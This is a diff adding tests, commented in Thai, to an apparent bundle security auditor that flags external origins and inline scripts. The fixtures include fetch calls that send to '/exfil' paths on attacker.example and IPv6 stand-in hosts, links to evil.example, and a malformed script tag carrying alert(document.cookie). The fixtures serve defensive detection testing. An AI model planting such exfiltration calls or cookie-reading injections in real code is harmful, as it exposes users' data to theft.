@@ -633,3 +633,106 @@ test('src และ type ของจริงต้องยังทำให�
     cleanup();
   }
 });
+
+// ── รอบรีวิวสองแกนบนคอมมิต 7ebf96c ───────────────────────────────────────────
+// สามในสี่ข้อเป็นช่อง "คลาสเดียวกับที่เพิ่งปิด" — แก้บั๊กแล้วปิดไม่ครบคลาส
+// เป็นรูปแบบที่เกิดซ้ำเป็นรอบที่สามในสาขานี้ เทสชุดนี้จึงคุมทั้งคลาส ไม่ใช่แค่เคสที่รายงาน
+
+test('//host ใน attribute ของ HTML ต้องถูกจับ ไม่ใช่แค่ใน url() และ fetch (review ก)', () => {
+  // เอกสารเขียนว่าจับ `//host` "เฉพาะที่มีบริบทบอกว่าเป็น URL" — attribute อย่าง src/href
+  // คือบริบทที่แรงกว่า url() ด้วยซ้ำ การไม่ตรวจจึงทำให้คำอธิบายข้อจำกัดบรรยายของจริงผิด
+  const { dir, cleanup } = makeDist({
+    'index.html':
+      '<!doctype html><html><head><link rel="stylesheet" href="//cdn.evil.example/x.css"></head>' +
+      '<body><img src="//cdn2.evil.example/x.png"></body></html>',
+  });
+  try {
+    const { findings } = auditBundle(dir, POLICY);
+    assert.ok(findings.some((f) => /cdn\.evil\.example/.test(f.detail)), `href: ${JSON.stringify(findings)}`);
+    assert.ok(findings.some((f) => /cdn2\.evil\.example/.test(f.detail)), `src: ${JSON.stringify(findings)}`);
+  } finally {
+    cleanup();
+  }
+});
+
+test('attribute ที่เป็น path สัมพัทธ์หรือ origin ที่ policy อนุญาต ต้องไม่ถูกจับ (กันแก้เกิน)', () => {
+  const { dir, cleanup } = makeDist({
+    'index.html':
+      '<!doctype html><html><head><link rel="stylesheet" href="/assets/a.css">' +
+      '<link rel="preconnect" href="//fonts.gstatic.com"></head>' +
+      '<body><img src="/assets/x.png"><img src="data:image/png;base64,AAA"></body></html>',
+    'assets/a.css': '.x{color:red}',
+  });
+  try {
+    const { findings } = auditBundle(dir, POLICY);
+    assert.deepEqual(findings, [], JSON.stringify(findings));
+  } finally {
+    cleanup();
+  }
+});
+
+test('host ที่ไม่ได้ขึ้นต้นด้วยตัวอักษร/ตัวเลข ต้องไม่หลุด (review ข)', () => {
+  // `/^\/\/[a-zA-Z0-9]/` ตัด IPv6 literal และ host ที่ขึ้นต้นด้วย _ ทิ้งเป็น null แล้วกฎรวม
+  // ก็มองไม่เห็นเพราะบังคับ https?:// เหมือนกัน = ไม่มีกฎไหนครอบ ซึ่งคือเหตุผลเดิมของ review #1
+  const { dir, cleanup } = makeDist({
+    ...cleanFiles,
+    'assets/v6.js': 'fetch("//[2001:db8::1]/exfil");',
+    'assets/us.js': 'fetch("//_x.attacker.example/exfil");',
+  });
+  try {
+    const { findings } = auditBundle(dir, POLICY);
+    assert.ok(findings.some((f) => /2001:db8/.test(f.detail)), `IPv6: ${JSON.stringify(findings)}`);
+    assert.ok(findings.some((f) => /_x\.attacker\.example/.test(f.detail)), `underscore: ${JSON.stringify(findings)}`);
+  } finally {
+    cleanup();
+  }
+});
+
+test('URL รูปเต็มต้องถูกนับครั้งเดียว ไม่ใช่ซ้ำจากสองกฎ (review ค)', () => {
+  // CSS_URL เลิกบังคับ `//` แล้วจึงทับกับ generic scan · flag i ยังทำให้ `new URL(` เข้าข่ายด้วย
+  // ผลคือจำนวนครั้งในข้อความ error ผิดเป็นเท่าตัว ซึ่งขัด Global Constraint ที่ว่า error ต้องบอก
+  // "สิ่งที่เจอ" ให้ตรง — ตัวเลขที่ผิดคือข้อมูลที่ผิด ไม่ใช่แค่ความสวยงาม
+  const { dir, cleanup } = makeDist({
+    'a.css': '.h{background:url(https://cdn.example.com/y.png)}',
+    'b.js': 'const u=new URL("https://evil.example/x");',
+  });
+  try {
+    const { findings } = auditBundle(dir, POLICY);
+    for (const origin of [/cdn\.example\.com/, /evil\.example/]) {
+      const hit = findings.find((f) => origin.test(f.detail));
+      assert.ok(hit, JSON.stringify(findings));
+      assert.doesNotMatch(hit.detail, /ครั้งในไฟล์นี้/, `เจอครั้งเดียวต้องไม่มีจำนวนครั้ง: ${hit.detail}`);
+    }
+  } finally {
+    cleanup();
+  }
+});
+
+test('origin เดียวที่โผล่หลายครั้งจริง ต้องยังรายงานจำนวนครั้งถูกต้อง (กันแก้เกิน)', () => {
+  const { dir, cleanup } = makeDist({
+    ...cleanFiles,
+    'assets/many.js': 'a("https://x.example/1");b("https://x.example/2");c("https://x.example/3");',
+  });
+  try {
+    const { findings } = auditBundle(dir, POLICY);
+    const hit = findings.find((f) => /x\.example/.test(f.detail));
+    assert.ok(hit, JSON.stringify(findings));
+    assert.match(hit.detail, /\(3 ครั้งในไฟล์นี้\)/, hit.detail);
+  } finally {
+    cleanup();
+  }
+});
+
+test('แท็กที่ quote ปิดไม่ครบต้องไม่ถูกเชื่อว่ามี src (review ง)', () => {
+  // `<script data-x=" src=y>` ทำให้ตัวแตก attribute ไปเจอ `src=y` เป็น attribute ใหม่
+  // แล้วข้ามแท็กทั้งอัน — fail-open รูปเดียวกับ review #3 · แยก attribute ไม่ได้ = ต้องตรวจต่อ
+  const { dir, cleanup } = makeDist({
+    'index.html': '<!doctype html><html><body><script data-x=" src=y>alert(document.cookie)</script></body></html>',
+  });
+  try {
+    const { findings } = auditBundle(dir, POLICY);
+    assert.ok(findings.some((f) => f.rule === 'inline-script'), JSON.stringify(findings));
+  } finally {
+    cleanup();
+  }
+});
